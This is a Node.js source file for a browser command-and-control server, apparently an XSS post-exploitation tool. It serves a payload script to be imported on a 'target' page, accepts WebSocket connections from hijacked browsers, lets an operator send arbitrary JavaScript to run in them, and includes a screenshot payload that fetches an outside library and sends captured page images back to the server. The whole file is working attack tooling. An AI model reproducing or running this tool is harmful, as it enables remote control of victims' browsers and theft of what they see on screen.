const express = require('express')
const cors = require('cors')
const ws = require('ws')
const prompts = require('prompts')
const fs = require('fs')

argv = require('minimist')(process.argv.slice(2), {
  string: ['port', 'file'],
  alias: {p: 'port', f: 'file'},
  default: {port: 3000, file: 'client.js'},
  help: true
})

console.log(`Listening on port ${argv.port}.\nImport the script located at /${argv.file} on your target`)

const app = express()
app.use(cors())
const server = app.listen(argv.port)
const wsServer = new ws.Server({ server })

app.get(`/${argv.file}`, (req, res) => {
  const websocket = `ws${req.protocol == 'https' ? 's':''}://${req.get('host')}/`
  const payload = fs.readFileSync('./payloads/client.js', 'utf8').replace('%websocket%', websocket)
  res.type('application/javascript')
  res.send(payload)
})

// let clientSocket = false
let clients = []
let prompt = false
let first = true
let selected = -1

wsServer.on('connection', socket => {
  const id = clients.length
  console.log(`client connected. ID: ${id}`)
  clients.push(socket)
  // clientSocket = socket
  socket.on('message', msg => handleMessage(msg, id))
  socket.on('close', () => console.log(`ID ${id} disconnected.`))
})

async function handleMessage(message, id) {
  message = message.toString()
  message = JSON.parse(message)
  switch (message.type) {
    case 'output':
      console.log(`${id} > ${message.data}`)
      break

    case 'info':
      console.log(`${id} | UA: ${message.data.browser}\nURL: ${message.data.url}`)
      break
    
    case 'ss':
      const filename = `screenshot_${Date.now()}.png`
      const data = Buffer.from(message.data.replace('data:image/png;base64,', ''), 'base64')
      console.log(`Received screenshot from ${id}! Saved to ${filename}`)
      fs.writeFileSync(filename, data)
      break
  
    default:
      console.log(`Received unknown payload type from id ${id}: ${JSON.stringify(message)}`)
      break
  }

  if (!prompt && selected === id) commandPrompt()
  if (first) selector()
}

async function selector() {
  first = false 
  const { id } = await prompts({
    type: 'number',
    name: 'id',
    message: 'Client ID'
  })
  if (id === undefined) return process.exit() 
  if (!clients[id]) return selector()
  selected = id
  commandPrompt()
}

async function commandPrompt() {
  prompt = true
  const { cmd } = await prompts({
    type: 'text',
    name: 'cmd',
    message: `js (${selected})`
  })
  prompt = false

  switch (cmd) {
    case '.exit':
      selected = -1
      selector()
      return
    
    case '.ss':
      takeSS()
  
    default:
      clients[selected].send(JSON.stringify({ type: 'run', data: cmd }))
  }

  setTimeout(() => {
    if (!prompt) {
      console.log('Output timed out.')
      commandPrompt()
    }
  }, 2000)
}

function takeSS() {
  console.log('Sending screenshot payload...')
  const payload = `import('https://html2canvas.hertzen.com/dist/html2canvas.min.js').then(() => html2canvas(document.body).then(canvas => socket.send(JSON.stringify({type:'ss',data:canvas.toDataURL('image/png')}))))`
  clients[selected].send(JSON.stringify({ type: 'run', data: payload, noout: true }))
  console.log('Payload sent.')
  setTimeout(() => {
    if (!prompt) {
      console.log('Output timed out.')
      commandPrompt()
    }
  }, 2000)
}